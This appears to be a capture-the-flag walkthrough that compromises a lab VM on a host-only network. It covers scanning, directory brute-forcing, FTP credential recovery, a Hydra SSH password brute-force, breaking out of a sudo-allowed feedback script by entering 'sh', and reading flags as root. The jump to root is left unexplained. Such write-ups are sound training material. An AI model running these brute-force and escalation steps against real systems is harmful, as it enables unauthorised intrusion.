Step 1: Finding the Machine on the Network using:

Identifying the target machine's active IP address by scanning the local host-only network interface.

•	Ip a

•	sudo arp-scan --interface=eth1 192.168.56.0/24

<img width="602" height="365" alt="image" src="https://github.com/user-attachments/assets/158a7ba3-5885-4c5d-804d-2b96fd889efa" />
 


Step 2: Recon with Nmap

Conducting an initial port scan against the target IP to discover open ports and determine which network services are running.

•	nmap 192.168.56.103

<img width="602" height="154" alt="image" src="https://github.com/user-attachments/assets/1b0255a3-5698-4ff5-b1a4-ed91d91ce446" />



Step 3: Visiting the Website 

Navigating to 192.168.56.103 in the web browser.

Accessing the target's web server on Port 80 to enumerate the web application and look for visible clues or hidden directories.

<img width="602" height="372" alt="image" src="https://github.com/user-attachments/assets/a7b01853-2978-4d23-b47d-f2566daa2703" />


 
Step 4: Finding Hidden Web Paths

Performing web directory brute-forcing using a medium-sized wordlist to locate hidden directories and unlinked files on the web server.

•	gobuster dir -u http://192.168.56.103 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

<img width="581" height="222" alt="image" src="https://github.com/user-attachments/assets/079c1e1e-a190-4912-93e2-03439f3534f5" />

Navigating to http://192.168.56.103/hidden_text

<img width="599" height="311" alt="image" src="https://github.com/user-attachments/assets/007c5e1d-8194-47db-8482-0d8250e45fbb" />

Qr code appeared when click Thank You

<img width="301" height="265" alt="image" src="https://github.com/user-attachments/assets/73a6ebf2-1226-4daa-9e53-22b6376a137a" />

 

Step 5: Cracking the QR Code

Decoded it using an online QR decoder

<img width="602" height="140" alt="image" src="https://github.com/user-attachments/assets/49306bba-3e55-48f9-85a6-e6b0d9f1f88f" />



Step 6: FTP Login 

Authenticating to the target's FTP server using the recovered credentials to enumerate the file directory and download files containing potential clues and password wordlists.

Connect use ftp 192.168.56.103

Then you listed files:

•	ls

And downloaded two files:

•	get information.txt

•	get p_lists.txt

<img width="602" height="321" alt="image" src="https://github.com/user-attachments/assets/a55830ee-6941-4f10-90d6-795efa5b90ff" />

 
Read: 

•	cat information.txt

•	cat p_lists.txt

<img width="582" height="98" alt="image" src="https://github.com/user-attachments/assets/0f17c303-f189-4eb8-9adf-0a0b5e752883" />

<img width="602" height="354" alt="image" src="https://github.com/user-attachments/assets/b8d43219-dc6c-4422-9c4c-90e57048d8d1" />



Step 7: Attacking SSH

Launching a brute-force attack against the SSH service using Hydra to find the valid password for user robin from the downloaded wordlist.

•	hydra -l robin -P p_lists.txt ssh://192.168.56.103

<img width="591" height="142" alt="image" src="https://github.com/user-attachments/assets/1c548c5d-373a-4a16-85af-6d6fa433210e" />
 


Step 8: Logging in as robin

Establishing an interactive remote terminal session via SSH using the cracked credentials to gain initial low-privileged shell access as user robin.

•	ssh robin@192.168.56.103

<img width="585" height="173" alt="image" src="https://github.com/user-attachments/assets/fc1dee8c-b235-448e-b59d-14175ddaef2f" />



Step 9: Capturing Flags

Listing all hidden files in the home directory to find the initial user flag, and navigating into the project directory to locate files for the next phase.

•	ls -la

•	cd project

<img width="602" height="139" alt="image" src="https://github.com/user-attachments/assets/91f48b91-0e50-449f-a77d-33dfde0ad16d" />


•	ls

<img width="602" height="25" alt="image" src="https://github.com/user-attachments/assets/3cc34959-441e-4259-92c3-ba1f9acb4d57" />


•	sudo -l

<img width="602" height="63" alt="image" src="https://github.com/user-attachments/assets/9b231810-6bab-49bf-80af-53a553cae9d2" />


•	ls -la

•	cat user1.txt

and we get the first flag.

<img width="602" height="178" alt="image" src="https://github.com/user-attachments/assets/c0c39a68-144f-419c-a950-d70c0ea31138" />



Step 10: Privilege Escalation Begins

Reviewing the allowed sudo privileges for the current user to find binaries or scripts that can be executed as another user without a password.

•	sudo -l

<img width="575" height="93" alt="image" src="https://github.com/user-attachments/assets/70112873-ec27-4944-b354-05941d2851a4" />


•	cd project

•	ls

•	cat feedback.sh

<img width="591" height="189" alt="image" src="https://github.com/user-attachments/assets/c1ca1de4-b439-4737-90a3-7f1ba1516ccb" />


Escaping the feedback script using the 'sh' input vulnerability

•	Enter Your Name : fathanah

•	Enter You Feedback About This Target Machine : sh

Confirming successful horizontal privilege escalation to user: jerry

•	whoami

Stabilizing the simple shell into an interactive TTY bash session

•	python3 -c 'import pty; pty.spawn("/bin/bash")'

Navigating to the new user's home directory

•	cd /home/jerry

Enumerating the directory contents (including hidden files) to locate the flag

•	ls -la

Reading the second flag file

•	cat user2.txt

<img width="591" height="374" alt="image" src="https://github.com/user-attachments/assets/eb70a4e0-5c04-416b-b3ee-dd7e0c23da3c" />



Step 11: Achieving Root Access

Confirming root privileges, navigating to the root user's home directory, and reading the final flag file to successfully complete the target machine exploit.

•	id

<img width="602" height="35" alt="image" src="https://github.com/user-attachments/assets/8518065f-aa75-4973-95d0-3157634c5520" />


After 

#

•	Type whoami

•	cd /root

•	ls -la

And when find root.txt files, read it using cat root.txt and we got the last flag

<img width="602" height="346" alt="image" src="https://github.com/user-attachments/assets/0b2c3601-8737-4452-92d5-7c4c8c25c521" />




